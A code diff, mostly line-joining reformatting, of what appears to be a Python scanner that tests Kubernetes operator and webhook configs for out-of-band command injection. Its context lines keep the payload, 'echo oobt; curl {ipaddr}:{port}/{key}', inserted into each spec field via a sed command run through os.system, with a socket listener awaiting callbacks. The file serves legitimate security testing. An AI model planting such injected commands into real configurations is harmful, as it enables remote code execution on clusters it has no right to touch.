@@ -124,9 +124,7 @@ def count_total_leaf_keys(data):
 
 
 # pylint: disable=R0913
-def find_leaf_keys_and_test(
-    data, original_file, ipaddr, port, total_leaf_keys, processed_leaf_keys=0
-):
+def find_leaf_keys_and_test(data, original_file, ipaddr, port, total_leaf_keys, processed_leaf_keys=0):
     """
     Iterate the spec data and test each parameter by modifying the value with the attack payload.
     Test cases: appending 'curl' command, TBD
@@ -139,9 +137,7 @@ def find_leaf_keys_and_test(
             )
         else:
             processed_leaf_keys += 1
-            logging.info(
-                f"Testing a leaf key: '{key}', ({processed_leaf_keys} / {total_leaf_keys})"
-            )
+            logging.info(f"Testing a leaf key: '{key}', ({processed_leaf_keys} / {total_leaf_keys})")
             cmd = f"sed 's/{key}:.*/{key}: \"echo oobt; curl {ipaddr}:{port}\\/{key}\"/g' {original_file} > {tmp_file}"
             logging.debug(f"Command run: {cmd}")
             os.system(cmd)
@@ -173,9 +169,7 @@ def scan_with_k8s_config(cfg_file_path: str, obj_data: dict, ipaddr: str, port: 
     spec_data = obj_data.get("spec", {})
     total_leaf_keys = count_total_leaf_keys(spec_data)
     # Apply Kubernetes config (e.g. CR for Operator, or Pod/resource for webhook)
-    find_leaf_keys_and_test(
-        spec_data, cfg_file_path, ipaddr, port, total_leaf_keys
-    )
+    find_leaf_keys_and_test(spec_data, cfg_file_path, ipaddr, port, total_leaf_keys)
 
 
 def start_socket_listener(port, shared_queue, data_received, stop_event, duration):
@@ -183,9 +177,7 @@ def start_socket_listener(port, shared_queue, data_received, stop_event, duratio
     try:
         server_socket.bind((SERVER_HOST, port))
     except OSError as e:
-        logging.error(
-            f"{e}. Stopping the server. It might take a few seconds. Please try again later."
-        )
+        logging.error(f"{e}. Stopping the server. It might take a few seconds. Please try again later.")
         stop_event.set()
         server_socket.close()
         return
@@ -215,9 +207,7 @@ def start_socket_listener(port, shared_queue, data_received, stop_event, duratio
             break
 
     except socket.timeout:
-        logging.info(
-            "Socket timeout reached as the test duration expired. Stopping the server."
-        )
+        logging.info("Socket timeout reached as the test duration expired. Stopping the server.")
 
     except Exception as e:
         raise RuntimeError("An error occurred. See logs for details.") from e
@@ -292,9 +282,7 @@ def check_can_create(obj_data: dict) -> bool:
 # pylint: disable=R0915
 def main():
     # Parse command-line arguments
-    parser = argparse.ArgumentParser(
-        description="Simulate a socket listener and respond to requests."
-    )
+    parser = argparse.ArgumentParser(description="Simulate a socket listener and respond to requests.")
     parser.add_argument(
         "-i",
         "--ip-addr",
@@ -316,9 +304,7 @@ def main():
         default=300,
         help="Duration for the listener thread to run in seconds (default: 300 seconds)",
     )
-    parser.add_argument(
-        "-f", "--filename", type=str, required=True, help="Kubernetes config file path"
-    )
+    parser.add_argument("-f", "--filename", type=str, required=True, help="Kubernetes config file path")
     # add argument for '-o' to output the result to a file
     parser.add_argument(
         "-o",
@@ -397,9 +383,7 @@ def main():
         time.sleep(1)  # Adjust the sleep duration as needed
         elapsed_time_main = time.time() - start_time_main
         if elapsed_time_main >= args.duration:
-            logging.debug(
-                f"The duration of {args.duration} seconds has reached. Exiting..."
-            )
+            logging.debug(f"The duration of {args.duration} seconds has reached. Exiting...")
             stop_event.set()
 
         if data_received.is_set():
@@ -408,9 +392,7 @@ def main():
             print_result(sarif_output, args.output, True)
 
             vulnerability_count += 1
-            logging.info(
-                f"A vulnerability has been found. Total: {vulnerability_count}"
-            )
+            logging.info(f"A vulnerability has been found. Total: {vulnerability_count}")
 
             data_has_been_received = True
 
